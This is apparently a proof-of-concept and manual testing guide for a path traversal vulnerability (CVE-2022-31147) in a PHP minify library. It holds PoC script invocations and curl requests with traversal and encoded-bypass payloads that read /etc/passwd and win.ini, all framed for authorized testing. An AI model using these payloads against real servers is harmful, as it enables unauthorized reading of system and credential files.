# CVE-2022-31147 Proof of Concept & Manual Testing Guide

This guide provides comprehensive methodologies for testing CVE-2022-31147, a critical path traversal vulnerability affecting the widely used matthiasmullie/minify library. The vulnerability allows attackers to exploit insufficient input sanitization in the minify endpoint, potentially enabling arbitrary file read operations on both Linux and Windows servers. This guide is tailored for security professionals, penetration testers, and researchers seeking to evaluate the exposure of web applications to this threat.

The core of the guide is an automated Python proof-of-concept script, which systematically generates and tests a wide array of traversal payloads. These payloads utilize various depths of directory traversal (../), multiple encoding schemes (such as URL encoding and double encoding), and endpoint variations (including fake extensions and query parameters) to bypass common routing and filtering mechanisms. By leveraging these techniques, the script maximizes the likelihood of detecting vulnerable configurations, even in environments protected by basic web application firewalls or custom routing logic.

Detection accuracy is further enhanced through built-in heuristics that analyze response content for known file markers. For Linux targets, the script searches for patterns typical of /etc/passwd or other sensitive files, while for Windows systems, it looks for indicators within files like win.ini. This approach ensures that successful exploitation is reliably identified, minimizing false positives and streamlining the validation process.

In addition to automated testing, the guide outlines manual validation techniques using curl, enabling practitioners to craft and send custom requests for targeted analysis or to verify findings independently. Recommendations for safe and authorized testing are emphasized throughout, including the importance of conducting assessments only on systems for which explicit permission has been granted.

The guide is designed to support both rapid validation and in-depth analysis, accommodating custom file targets and advanced bypass strategies. It can be integrated into broader vulnerability assessment workflows, providing actionable insights for remediation and risk management. By following the methodologies presented, security teams can effectively identify, validate, and address CVE-2022-31147 exposures in their environments, strengthening the overall security posture of their web applications.
---

## Automated Python PoC

### **Linux Target Example**
```bash
python3 cve-2022-31147_poc.py --base https://yourdomain.tld/cdn/minify --linux --file /etc/passwd
```

### **Windows Target Example**
```bash
python3 cve-2022-31147_poc.py --base https://yourdomain.tld/cdn/minify --windows --file C:\Windows\win.ini
```

### **Safer Test (Recommended)**
Create a harmless file on the server, then attempt to read it:
```bash
python3 cve-2022-31147_poc.py --base https://yourdomain.tld/cdn/minify --file /var/www/test.txt
```

---

## Manual Testing with curl

### **Linux Path Traversal**
```bash
curl -i "https://yourdomain.tld/cdn/minify/../../../../../../etc/passwd"
```

### **Windows Path Traversal**
```bash
curl -i "https://yourdomain.tld/cdn/minify/../../../../../../windows/win.ini"
```

### **Bypass Variants**
```bash
curl -i "https://yourdomain.tld/cdn/minify/%2e%2e/../%2e%2e/../../etc/passwd"
curl -i "https://yourdomain.tld/cdn/minify/../../../../../../etc/passwd.css"
```

---

## **Notes**
- Replace `https://yourdomain.tld/cdn/minify` with your actual target URL.
- For safer testing, use a file you control and know exists on the server.
- Always have permission before testing on any system.

---

## **References**
- [CVE-2022-31147](https://nvd.nist.gov/vuln/detail/CVE-2022-31147)